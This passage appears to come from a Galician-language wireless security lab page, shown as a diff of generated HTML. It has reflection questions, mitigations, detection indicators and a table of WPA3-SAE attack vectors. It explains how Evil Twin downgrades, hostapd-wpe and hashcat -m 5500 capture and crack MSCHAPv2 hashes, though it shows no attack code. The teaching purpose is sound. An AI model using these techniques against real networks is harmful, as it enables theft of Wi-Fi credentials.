+<h2 id="8-limpeza">8. Limpeza</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>reset
+</span></code></pre></div>
+<h2 id="9-preguntas-de-reflexion">9. Preguntas de reflexión</h2>
+<ol>
+<li>
+<p><strong>Por que WPA3-SAE non é vulnerable a cracking offline pero si a Evil Twin?</strong></p>
+<ul>
+<li>Forward Secrecy garante que cada sesión SAE deriva claves únicas → o handshake capturado non é reutilizable nin crackeble offline</li>
+<li>Pero o modo transición permite downgrade a WPA2 → o cliente conecta ao Evil Twin e expón as credenciais</li>
+</ul>
+</li>
+<li>
+<p><strong>Que é o modo transición WPA2/WPA3?</strong></p>
+<ul>
+<li>Configuración que permite <code>key_mgmt=SAE WPA-PSK</code> (ou <code>SAE WPA-EAP</code>) simultaneamente para compatibilidade durante a migración a WPA3</li>
+<li>Vulnerable a downgrade: se o atacante presenta un AP só WPA2, o cliente conecta sen resistencia</li>
+</ul>
+</li>
+<li>
+<p><strong>Por que o cliente aceptou o Evil Twin WPA2-PSK sen verificar que o AP anterior usaba SAE?</strong></p>
+<ul>
+<li><code>wpa_supplicant</code> con <code>key_mgmt=SAE WPA-PSK</code> fai fallback automático a PSK cando o AP non anuncia SAE</li>
+<li>Non hai memoria de que ese SSID usaba SAE anteriormente — é unha limitación de deseño do modo transición</li>
+</ul>
+</li>
+<li>
+<p><strong>Por que o cliente conectou ao Evil Twin WPA2-EAP sen <code>ca_cert</code>?</strong></p>
+<ul>
+<li>Sen <code>ca_cert</code>, <code>wpa_supplicant</code> acepta calquera certificado TLS presentado polo servidor EAP</li>
+<li>O cliente entra no túnel TLS de hostapd-wpe e envía o hash MSCHAPv2 sen verificar a identidade do servidor</li>
+<li>Con <code>ca_cert</code> configurado, o cliente rexeitaría o certificado auto-asinado e o ataque fallaría</li>
+</ul>
+</li>
+<li>
+<p><strong>Cal é a diferenza técnica entre crackear con <code>aircrack-ng</code> (PSK) e con <code>hashcat -m 5500</code> (EAP)?</strong></p>
+<ul>
+<li><code>aircrack-ng</code> reconstrúe o PMK desde o 4-way handshake WPA2-PSK e proba contrasinais directamente</li>
+<li><code>hashcat -m 5500</code> ataca o hash NetNTLMv1 de MSCHAPv2: DES de 56 bits efectivos → crackeble en segundos con wordlist</li>
+<li>MSCHAPv2 é estruturalmente débil (DES, sen sal); un contrasinal en rockyou cae en segundos en calquera caso</li>
+</ul>
+</li>
+<li>
+<p><strong>Como evitar este ataque de forma completa (defensa en profundidade)?</strong></p>
+<ul>
+<li><strong>AP en modo WPA3-only</strong> (<code>wpa_key_mgmt=SAE</code>, sen <code>WPA-PSK</code> nin <code>WPA-EAP</code>) → elimina o vector de downgrade</li>
+<li><strong>Cliente en modo WPA3-only</strong> (<code>key_mgmt=SAE</code> exclusivamente) → rexeita APs que non usen SAE</li>
+<li><strong><code>ca_cert</code> no cliente</strong> (se se usa EAP) → rexeita certificados falsos de Evil Twins EAP</li>
+<li><strong>EAP-TLS</strong> en lugar de PEAP/MSCHAPv2 → elimina o risco de cracking do hash (non hai contrasinal, só certificados mutuos)</li>
+<li><strong>Monitorización IDS/SIEM</strong> de cambios de BSSID no mesmo ESSID e desautenticacións masivas</li>
+</ul>
+</li>
+<li>
+<p><strong>É posible este ataque contra un AP WPA3-only (<code>key_mgmt=SAE</code> exclusivo)?</strong></p>
+<ul>
+<li><strong>NON.</strong> O cliente con <code>key_mgmt=SAE</code> ignora APs que non anuncien SAE → o Evil Twin WPA2 non é seleccionado nunca</li>
+</ul>
+</li>
+<li>
+<p><strong>Como detectar este ataque na rede?</strong></p>
+<ul>
+<li><strong>IDS wireless</strong>: dous APs co mesmo SSID pero diferente BSSID ou diferente cifrado (SAE vs PSK/EAP)</li>
+<li><strong>Logs do AP lexítimo</strong>: <code>AP-STA-DISCONNECTED</code> masivos sen deauth lexítimas</li>
+<li><strong>Logs do cliente</strong>: cambio de <code>key_mgmt</code> de SAE a PSK ou EAP (<code>CTRL-EVENT-CONNECTED</code> a un BSSID distinto)</li>
+<li><strong>SIEM</strong>: correlación de caída do AP + nova asociación do cliente a BSSID descoñecido no mesmo ESSID</li>
+</ul>
+</li>
+<li>
+<p><strong>Que diferenza hai entre o ataque desta práctica e o da Práctica 2.2 (Evil Twin WPA2-EAP)?</strong></p>
+<ul>
+<li>Práctica 2.2: o AP lexítimo xa é WPA2-EAP → o Evil Twin duplica directamente ese modo</li>
+<li>Práctica 3.3: o AP lexítimo é WPA3-SAE → require primeiro un <strong>DoS</strong> para forzar ao cliente a buscar alternativas e logo o <strong>downgrade</strong> a WPA2 (PSK ou EAP)</li>
+<li>O resultado (hash MSCHAPv2 + jtr/hashcat) é o mesmo, pero o vector de entrada é máis complexo</li>
+</ul>
+</li>
+<li>
+<p><strong>Wifite pode executar algún paso deste ataque?</strong></p>
+<ul>
+<li><strong>NON.</strong> Wifite non soporta: configuración de Evil Twins, orquestración de downgrade WPA3→WPA2, nin integración con hostapd-wpe. Está deseñado para auditoría pasiva WPA2-PSK exclusivamente.</li>
+</ul>
+</li>
+</ol>
+<h2 id="10-comparativa-de-vectores-de-ataque-contra-wpa3-sae">10. Comparativa de vectores de ataque contra WPA3-SAE</h2>
+<table>
+<thead>
+<tr>
+<th>Vector</th>
+<th>Posible?</th>
+<th>Mitigación</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cracking offline do handshake SAE</td>
+<td>✗ Non</td>
+<td>Forward Secrecy (SAE/Dragonfly) — clave por sesión</td>
+</tr>
+<tr>
+<td>KRACK (reinstalación de claves)</td>
+<td>✗ Non</td>
+<td>PMF obrigatorio (<code>ieee80211w=2</code>) — ver Práctica 3.2</td>
+</tr>
+<tr>
+<td>DoS con dragondrain</td>
+<td>✔ hostapd ≤ 2.7</td>
+<td>Actualizar hostapd ≥ 2.8 + <code>sae_anti_clogging_threshold=5</code></td>
+</tr>
+<tr>
+<td>Evil Twin + downgrade WPA2-<strong>PSK</strong></td>
+<td>✔ Con modo transición</td>
+<td>AP e cliente en modo WPA3-only (<code>key_mgmt=SAE</code> exclusivo)</td>
+</tr>
+<tr>
+<td>Evil Twin + downgrade WPA2-<strong>EAP</strong></td>
+<td>✔ Sen <code>ca_cert</code> no cliente</td>
+<td><code>ca_cert</code> obrigatorio + EAP-TLS en lugar de PEAP/MSCHAPv2</td>
+</tr>
+<tr>
+<td>Forza bruta online (wacker)</td>
+<td>✔ <strong>Sempre</strong></td>
+<td>Contrasinal ≥ 20 caracteres aleatorios + anti-clogging</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../../js/opera.js"></script>
+      
+        <script src="../../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
